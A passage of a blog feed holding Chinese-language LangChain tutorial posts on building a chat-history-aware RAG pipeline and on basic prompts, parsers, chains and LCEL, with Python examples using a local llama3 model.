        <content type="html"><![CDATA[<p>文档: <a href="https://python.langchain.com/docs/use_cases/question_answering/chat_history/">https://python.langchain.com/docs/use_cases/question_answering/chat_history/</a></p><h2 id="背景">背景</h2><p>QA过程中, 如果我们需要模型能够依据上下文来回答问题, 比如: "你可以详细描述你刚刚说的第二点吗?". 这种情况就需要给模型加上背景信息.</p><p>首先给出最基础的RAG. 这是不涉及背景问答的RAG.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"><span class="keyword">from</span> langchain <span class="keyword">import</span> hub</span><br><span class="line"><span class="keyword">from</span> langchain_chroma <span class="keyword">import</span> Chroma</span><br><span class="line"><span class="keyword">from</span> langchain_community.document_loaders <span class="keyword">import</span> WebBaseLoader</span><br><span class="line"><span class="keyword">from</span> langchain_core.output_parsers <span class="keyword">import</span> StrOutputParser</span><br><span class="line"><span class="keyword">from</span> langchain_core.runnables <span class="keyword">import</span> RunnablePassthrough</span><br><span class="line"><span class="keyword">from</span> langchain_community.llms <span class="keyword">import</span> Ollama</span><br><span class="line"><span class="keyword">from</span> langchain_community.chat_models.ollama <span class="keyword">import</span> ChatOllama</span><br><span class="line"><span class="keyword">from</span> langchain_community.embeddings <span class="keyword">import</span> OllamaEmbeddings</span><br><span class="line"><span class="keyword">from</span> langchain_text_splitters <span class="keyword">import</span> RecursiveCharacterTextSplitter</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load, chunk and index the contents of the blog.</span></span><br><span class="line">loader = WebBaseLoader(</span><br><span class="line">    web_paths=(<span class="string">&quot;https://lilianweng.github.io/posts/2023-06-23-agent/&quot;</span>,),</span><br><span class="line">    bs_kwargs=<span class="built_in">dict</span>(</span><br><span class="line">        parse_only=bs4.SoupStrainer(</span><br><span class="line">            class_=(<span class="string">&quot;post-content&quot;</span>, <span class="string">&quot;post-title&quot;</span>, <span class="string">&quot;post-header&quot;</span>)</span><br><span class="line">        )</span><br><span class="line">    ),</span><br><span class="line">)</span><br><span class="line">docs = loader.load()</span><br><span class="line"></span><br><span class="line"><span class="comment"># split and save to chroma</span></span><br><span class="line">text_splitter = RecursiveCharacterTextSplitter(chunk_size=<span class="number">1000</span>, chunk_overlap=<span class="number">200</span>)</span><br><span class="line">splits = text_splitter.split_documents(docs)</span><br><span class="line">vectorstore = Chroma.from_documents(documents=splits, embedding=OllamaEmbeddings(model=<span class="string">&quot;nomic-embed-text&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Retrieve and generate using the relevant snippets of the blog.</span></span><br><span class="line">retriever = vectorstore.as_retriever()</span><br><span class="line">prompt = hub.pull(<span class="string">&quot;rlm/rag-prompt&quot;</span>)</span><br><span class="line">llm = Ollama(model=<span class="string">&quot;llama3&quot;</span>, keep_alive=-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_docs</span>(<span class="params">docs</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\n\n&quot;</span>.join(doc.page_content <span class="keyword">for</span> doc <span class="keyword">in</span> docs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rag_chain = (</span><br><span class="line">    &#123;<span class="string">&quot;context&quot;</span>: retriever | format_docs, <span class="string">&quot;question&quot;</span>: RunnablePassthrough()&#125;</span><br><span class="line">    | prompt</span><br><span class="line">    | llm</span><br><span class="line">    | StrOutputParser()</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="contextualizing-the-question">Contextualizing the question</h2><p>要实现chat history, 首先得在前面加一条contextualizing链, 这条链的作用就是将问题情境化, 从而让最新的问题能够脱离背景, 进而可以连接另一条链来对问题进行回答. chat history的具体实现就是通过contextualizing chain来情境化问题, 比如我们要求模型:</p><blockquote><p>Given a chat history and the latest user question which might reference context in the chat history, formulate a standalone question which can be understood without the chat history. Do NOT answer the question, just <strong>reformulate</strong> it if needed and otherwise return it as is.</p></blockquote><p>这样返回的第二个问题就是可以回答的了. 然后这个问题会结合retriever返回相关doc, 附一个调试结果</p><p><img src="refomulated_question.png" /></p><h3 id="messageplaceholder">MessagePlaceholder</h3><p>字面意思, Message占位符, 可以通过对应key传入信息. 这个会作为chat history的占位符使用.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain_core.prompts <span class="keyword">import</span> MessagesPlaceholder</span><br><span class="line"></span><br><span class="line">prompt = MessagesPlaceholder(<span class="string">&quot;history&quot;</span>)</span><br><span class="line">prompt.format_messages() <span class="comment"># raises KeyError</span></span><br><span class="line"></span><br><span class="line">prompt = MessagesPlaceholder(<span class="string">&quot;history&quot;</span>, optional=<span class="literal">True</span>)</span><br><span class="line">prompt.format_messages() <span class="comment"># returns empty list []</span></span><br><span class="line"></span><br><span class="line">prompt.format_messages(</span><br><span class="line">    history=[</span><br><span class="line">        (<span class="string">&quot;system&quot;</span>, <span class="string">&quot;You are an AI assistant.&quot;</span>),</span><br><span class="line">        (<span class="string">&quot;human&quot;</span>, <span class="string">&quot;Hello!&quot;</span>),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"><span class="comment"># -&gt; [</span></span><br><span class="line"><span class="comment">#     SystemMessage(content=&quot;You are an AI assistant.&quot;),</span></span><br><span class="line"><span class="comment">#     HumanMessage(content=&quot;Hello!&quot;),</span></span><br><span class="line"><span class="comment"># ]</span></span><br></pre></td></tr></table></figure><h3 id="history-aware-retriever">history aware retriever</h3><h4 id="源码">源码</h4><p>有history就prompt转llm转parser然后retriever, 否则直接丢retriever.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">retrieve_documents: RetrieverOutputLike = RunnableBranch(</span><br><span class="line">    (</span><br><span class="line">        <span class="comment"># Both empty string and empty list evaluate to False</span></span><br><span class="line">        <span class="keyword">lambda</span> x: <span class="keyword">not</span> x.get(<span class="string">&quot;chat_history&quot;</span>, <span class="literal">False</span>),</span><br><span class="line">        <span class="comment"># If no chat history, then we just pass input to retriever</span></span><br><span class="line">        (<span class="keyword">lambda</span> x: x[<span class="string">&quot;input&quot;</span>]) | retriever,</span><br><span class="line">    ),</span><br><span class="line">    <span class="comment"># If chat history, then we pass inputs to LLM chain, then to retriever</span></span><br><span class="line">    prompt | llm | StrOutputParser() | retriever,</span><br><span class="line">).with_config(run_name=<span class="string">&quot;chat_retriever_chain&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="实际代码">实际代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.chains <span class="keyword">import</span> create_history_aware_retriever</span><br><span class="line"><span class="keyword">from</span> langchain_core.prompts <span class="keyword">import</span> ChatPromptTemplate, MessagesPlaceholder</span><br><span class="line"></span><br><span class="line">contextualize_q_system_prompt = <span class="string">&quot;&quot;&quot;Given a chat history and the latest user question \</span></span><br><span class="line"><span class="string">which might reference context in the chat history, formulate a standalone question \</span></span><br><span class="line"><span class="string">which can be understood without the chat history. Do NOT answer the question, \</span></span><br><span class="line"><span class="string">just reformulate it if needed and otherwise return it as is.&quot;&quot;&quot;</span></span><br><span class="line">contextualize_q_prompt = ChatPromptTemplate.from_messages(</span><br><span class="line">    [</span><br><span class="line">        (<span class="string">&quot;system&quot;</span>, contextualize_q_system_prompt),</span><br><span class="line">        MessagesPlaceholder(<span class="string">&quot;chat_history&quot;</span>),</span><br><span class="line">        (<span class="string">&quot;human&quot;</span>, <span class="string">&quot;&#123;input&#125;&quot;</span>),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line">history_aware_retriever = create_history_aware_retriever(</span><br><span class="line">    llm, retriever, contextualize_q_prompt</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="qa链">QA链</h2><p>contextualizing结束, 连接QA链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.chains <span class="keyword">import</span> create_retrieval_chain</span><br><span class="line"><span class="keyword">from</span> langchain.chains.combine_documents <span class="keyword">import</span> create_stuff_documents_chain</span><br><span class="line"></span><br><span class="line">qa_system_prompt = <span class="string">&quot;&quot;&quot;You are an assistant for question-answering tasks. \</span></span><br><span class="line"><span class="string">Use the following pieces of retrieved context to answer the question. \</span></span><br><span class="line"><span class="string">If you don&#x27;t know the answer, just say that you don&#x27;t know. \</span></span><br><span class="line"><span class="string">Use three sentences maximum and keep the answer concise.\</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;context&#125;&quot;&quot;&quot;</span></span><br><span class="line">qa_prompt = ChatPromptTemplate.from_messages(</span><br><span class="line">    [</span><br><span class="line">        (<span class="string">&quot;system&quot;</span>, qa_system_prompt),</span><br><span class="line">        MessagesPlaceholder(<span class="string">&quot;chat_history&quot;</span>),</span><br><span class="line">        (<span class="string">&quot;human&quot;</span>, <span class="string">&quot;&#123;input&#125;&quot;</span>),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">question_answer_chain = create_stuff_documents_chain(llm, qa_prompt)</span><br><span class="line"><span class="comment"># contextualizing_chain + QA_chain</span></span><br><span class="line">rag_chain = create_retrieval_chain(history_aware_retriever, question_answer_chain)</span><br></pre></td></tr></table></figure><p><code>create_stuff_documents_chain</code>就是单纯的连接 dictionary | prompt | llm | outputparser. 其中output_parser不存在即为StrOutputParser.</p><h2 id="final-result">final result</h2><p>总流程</p><p><img src="chat_history_chain.png" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain_core.messages <span class="keyword">import</span> HumanMessage</span><br><span class="line"></span><br><span class="line">chat_history = []</span><br><span class="line"></span><br><span class="line">question = <span class="string">&quot;What is Task Decomposition?&quot;</span></span><br><span class="line">ai_msg_1 = rag_chain.invoke(&#123;<span class="string">&quot;input&quot;</span>: question, <span class="string">&quot;chat_history&quot;</span>: chat_history&#125;)</span><br><span class="line">chat_history.extend([HumanMessage(content=question), ai_msg_1[<span class="string">&quot;answer&quot;</span>]])</span><br><span class="line"></span><br><span class="line">second_question = <span class="string">&quot;What are common ways of doing it?&quot;</span></span><br><span class="line">ai_msg_2 = rag_chain.invoke(&#123;<span class="string">&quot;input&quot;</span>: second_question, <span class="string">&quot;chat_history&quot;</span>: chat_history&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ai_msg_1[<span class="string">&quot;answer&quot;</span>])</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(ai_msg_2[<span class="string">&quot;answer&quot;</span>])</span><br></pre></td></tr></table></figure><p><img src="QA_answer.png" /></p><h2 id="return-source">return source</h2><p>这部分是由<code>create_retrieval_chain</code>做到的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> document <span class="keyword">in</span> ai_msg_2[<span class="string">&quot;context&quot;</span>]:</span><br><span class="line">    <span class="built_in">print</span>(document)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><p><img src="source.png" /></p><h2 id="持久化">持久化</h2><p>刚刚我们的history是通过手动extend一个list来实现的, 实际应用中可能会有持久化和自动化的需求.</p><p>这里可以用到</p><ul><li><a href="https://python.langchain.com/docs/modules/memory/chat_messages/">BaseChatMessageHistory</a>: Store chat history.<br /></li><li><a href="https://python.langchain.com/docs/expression_language/how_to/message_history/">RunnableWithMessageHistory</a>: Wrapper for an LCEL chain and a BaseChatMessageHistory that handles injecting chat history into inputs and updating it after each invocation.</li></ul><p>那么前面一切照旧, 最后state加以处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain_core.chat_history <span class="keyword">import</span> BaseChatMessageHistory</span><br><span class="line"><span class="keyword">from</span> langchain_community.chat_message_histories <span class="keyword">import</span> ChatMessageHistory</span><br><span class="line"><span class="keyword">from</span> langchain_core.runnables.history <span class="keyword">import</span> RunnableWithMessageHistory</span><br><span class="line"><span class="comment">### Statefully manage chat history ###</span></span><br><span class="line">store = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_session_history</span>(<span class="params">session_id: <span class="built_in">str</span></span>) -&gt; BaseChatMessageHistory:</span><br><span class="line">    <span class="keyword">if</span> session_id <span class="keyword">not</span> <span class="keyword">in</span> store:</span><br><span class="line">        store[session_id] = ChatMessageHistory()</span><br><span class="line">    <span class="keyword">return</span> store[session_id]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conversational_rag_chain = RunnableWithMessageHistory(</span><br><span class="line">    rag_chain,</span><br><span class="line">    get_session_history,</span><br><span class="line">    input_messages_key=<span class="string">&quot;input&quot;</span>,</span><br><span class="line">    history_messages_key=<span class="string">&quot;chat_history&quot;</span>,</span><br><span class="line">    output_messages_key=<span class="string">&quot;answer&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">conversational_rag_chain.invoke(</span><br><span class="line">    &#123;<span class="string">&quot;input&quot;</span>: <span class="string">&quot;What is Task Decomposition?&quot;</span>&#125;,</span><br><span class="line">    config=&#123;</span><br><span class="line">        <span class="string">&quot;configurable&quot;</span>: &#123;<span class="string">&quot;session_id&quot;</span>: <span class="string">&quot;abc123&quot;</span>&#125;</span><br><span class="line">    &#125;,  <span class="comment"># constructs a key &quot;abc123&quot; in `store`.</span></span><br><span class="line">)[<span class="string">&quot;answer&quot;</span>]</span><br><span class="line"><span class="comment"># &quot;Task decomposition is a technique that breaks down complex tasks into smaller and simpler steps. It involves decomposing big tasks into multiple manageable tasks, making it easier to understand the model&#x27;s thinking process and interpret the results. This approach is often used in prompting techniques like Chain of Thought (CoT) to enhance model performance on complex tasks.&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conversational_rag_chain.invoke(</span><br><span class="line">    &#123;<span class="string">&quot;input&quot;</span>: <span class="string">&quot;What are common ways of doing it?&quot;</span>&#125;,</span><br><span class="line">    config=&#123;<span class="string">&quot;configurable&quot;</span>: &#123;<span class="string">&quot;session_id&quot;</span>: <span class="string">&quot;abc123&quot;</span>&#125;&#125;,</span><br><span class="line">)[<span class="string">&quot;answer&quot;</span>]</span><br><span class="line"><span class="comment"># &#x27;Task decomposition can be achieved through various methods, including:\n\n* Chain of Thought (CoT): Instructing the model to &quot;think step by step&quot; to decompose hard tasks into smaller and simpler steps.\n* Behavioral cloning over actions: Using a set of source policies trained for specific tasks to generate learning histories and distill them into a neural network.\n\nI don\&#x27;t know about other common ways.&#x27;</span></span><br></pre></td></tr></table></figure><p>顺便一提, 这里session_id是指对话的session, 同一session下有记忆, 否则无记忆, 官方给出的示例就很有代表性.</p><p><img src="official_history.png" /></p>]]></content>
      
      
      <categories>
          
          <category> ML NLP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>langchain简单学习</title>
      <link href="/2024/04/26/langchain%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/26/langchain%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>中文文档: <a href="https://python.langchain.com.cn/docs/modules/memory/types/">LangChain</a></p><p>官方都是用的openai的模型,但是免费资源我已经用完了,这里就用免费的llama.</p><h2 id="import">import</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain_community.llms <span class="keyword">import</span> Ollama</span><br><span class="line"><span class="keyword">from</span> langchain_community.chat_models.ollama <span class="keyword">import</span> ChatOllama</span><br><span class="line"><span class="comment"># llm</span></span><br><span class="line">llm = Ollama(model=<span class="string">&quot;llama3&quot;</span>, keep_alive=-<span class="number">1</span>)</span><br><span class="line"><span class="comment"># chat model</span></span><br><span class="line">chatmodel = ChatOllama(model=<span class="string">&#x27;llama3&#x27;</span>, keep_alive=-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><code>keep_alive=-1</code>可以保证模型总是在内存载入, 方便学习使用, 环境方面用的也是notebook, 块执行方便不少.</p><h2 id="prompt">prompt</h2><p>prompt将输入从dictionary读入template,本质format</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.prompts <span class="keyword">import</span> PromptTemplate</span><br><span class="line"></span><br><span class="line">prompt = PromptTemplate.from_template(<span class="string">&quot;What is a good name for a company that makes &#123;product&#125;?&quot;</span>)</span><br><span class="line">prompt.<span class="built_in">format</span>(product=<span class="string">&quot;colorful socks&quot;</span>)</span><br><span class="line"><span class="comment"># &#x27;What is a good name for a company that makes colorful socks?&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="message-type">Message type</h2><p>首先几种类型</p><p><img src="message_type.png" /></p><ul><li>HumanMessage: 来自人类/用户的ChatMessage。</li><li>AIMessage: 来自AI/助手的ChatMessage。</li><li>SystemMessage: 来自系统的ChatMessage。</li><li>FunctionMessage: 来自函数调用的ChatMessage。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.prompts.chat <span class="keyword">import</span> (</span><br><span class="line">    ChatPromptTemplate,</span><br><span class="line">    SystemMessagePromptTemplate,</span><br><span class="line">    HumanMessagePromptTemplate,</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 系统全局设定</span></span><br><span class="line">template = <span class="string">&quot;You are a helpful assistant that translates &#123;input_language&#125; to &#123;output_language&#125;.&quot;</span></span><br><span class="line">system_message_prompt = SystemMessagePromptTemplate.from_template(template)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户输入</span></span><br><span class="line">human_template = <span class="string">&quot;&#123;text&#125;&quot;</span></span><br><span class="line">human_message_prompt = HumanMessagePromptTemplate.from_template(human_template)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chat构建</span></span><br><span class="line">chat_prompt = ChatPromptTemplate.from_messages([system_message_prompt, human_message_prompt])</span><br><span class="line"></span><br><span class="line">chat_prompt.format_messages(input_language=<span class="string">&quot;English&quot;</span>, output_language=<span class="string">&quot;Chinese&quot;</span>, text=<span class="string">&quot;I love programming.&quot;</span>)</span><br><span class="line"><span class="comment"># [SystemMessage(content=&#x27;You are a helpful assistant that translates English to Chinese.&#x27;), HumanMessage(content=&#x27;I love programming.&#x27;)]</span></span><br></pre></td></tr></table></figure><h2 id="parser">parser</h2><p>负责输出解析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.schema <span class="keyword">import</span> BaseOutputParser</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CommaSeparatedListOutputParser</span>(<span class="title class_ inherited__">BaseOutputParser</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parse the output of an LLM call to a comma-separated list.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, text: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Parse the output of an LLM call.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> text.strip().split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"></span><br><span class="line">CommaSeparatedListOutputParser().parse(<span class="string">&quot;hi, bye&quot;</span>)</span><br><span class="line"><span class="comment"># [&#x27;hi&#x27;, &#x27;bye&#x27;]</span></span><br></pre></td></tr></table></figure><p>文档前面介绍的parser都非常简单, 几乎都是basemodel, 但其实parser提供的功能是一方面是输出解析, 另一方面也可以看作下一个pipline输入的preprocessing.</p><h2 id="chain">Chain</h2><p>模块连接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.chains <span class="keyword">import</span> LLMChain</span><br><span class="line"><span class="comment"># 系统全局设定</span></span><br><span class="line"><span class="comment"># template = &quot;You no nothing about &#123;subject&#125; and have no common sense.&quot;</span></span><br><span class="line">template = <span class="string">&quot;You are an expert in &#123;subject&#125;.&quot;</span></span><br><span class="line">system_message_prompt = SystemMessagePromptTemplate.from_template(template)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户输入</span></span><br><span class="line">human_template = <span class="string">&quot;&#123;text&#125;&quot;</span></span><br><span class="line">human_message_prompt = HumanMessagePromptTemplate.from_template(human_template)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chat构建</span></span><br><span class="line">chat_prompt = ChatPromptTemplate.from_messages([system_message_prompt, human_message_prompt])</span><br><span class="line">chain = LLMChain(</span><br><span class="line">    llm = llm,</span><br><span class="line">    prompt=chat_prompt,</span><br><span class="line">    output_parser=CommaSeparatedListOutputParser()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">chain.invoke(&#123;<span class="string">&#x27;subject&#x27;</span>:<span class="string">&#x27;math&#x27;</span>, <span class="string">&#x27;text&#x27;</span>:<span class="string">&#x27;try to predict the next 5 numbers: 1, 1, 2, 3, 5&#x27;</span>&#125;)</span><br><span class="line"><span class="comment"># &#123;&#x27;subject&#x27;: &#x27;math&#x27;,</span></span><br><span class="line"><span class="comment">#  &#x27;text&#x27;: [&#x27;A classic sequence!\n\nThis appears to be the Fibonacci sequence&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;where each number is the sum of the two preceding ones:\n\n1&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;1&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;2&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;3&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;5&#x27;,</span></span><br><span class="line"><span class="comment">#   &quot;...\n\nIf that&#x27;s correct&quot;,</span></span><br><span class="line"><span class="comment">#   &#x27;the next five numbers would be:\n\n8&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;13&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;21&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;34&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;55\n\nAm I right?&#x27;]&#125;</span></span><br></pre></td></tr></table></figure><h2 id="lcel">LCEL</h2><p>Langchain表达式, 官方描述的优势</p><ul><li>流式支持</li><li>异步</li><li>并行处理</li><li>重试回退</li><li>中间结果访问</li><li>输入输出模式</li><li>LangSmith跟踪以提供可调试性</li><li>无缝LangServe集成</li></ul><p>目前我只读到了并行.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain_core.output_parsers <span class="keyword">import</span> StrOutputParser</span><br><span class="line">prompt = ChatPromptTemplate.from_template(<span class="string">&#x27;tell me a short joke about &#123;topic&#125;&#x27;</span>)</span><br><span class="line">output_parser = StrOutputParser()</span><br><span class="line">chain = prompt | llm | output_parser</span><br><span class="line">chain.invoke(&#123;<span class="string">&#x27;topic&#x27;</span>:<span class="string">&#x27;large language model&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>这里的管道符负责的是连接组件</p><p>那么模型发生了什么呢?</p><ol type="1"><li>首先Prompt接受输入生成PromptValue</li><li>chatModel接收到PromptValue之后生成ChatMessage(如果是LLM的话输出为str)</li><li>最后ChatMessage丢入parser负责最终解析,最后输出</li></ol><h3 id="rag实例">RAG实例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain_community.vectorstores <span class="keyword">import</span> DocArrayInMemorySearch</span><br><span class="line"><span class="keyword">from</span> langchain_core.output_parsers <span class="keyword">import</span> StrOutputParser</span><br><span class="line"><span class="keyword">from</span> langchain_core.prompts <span 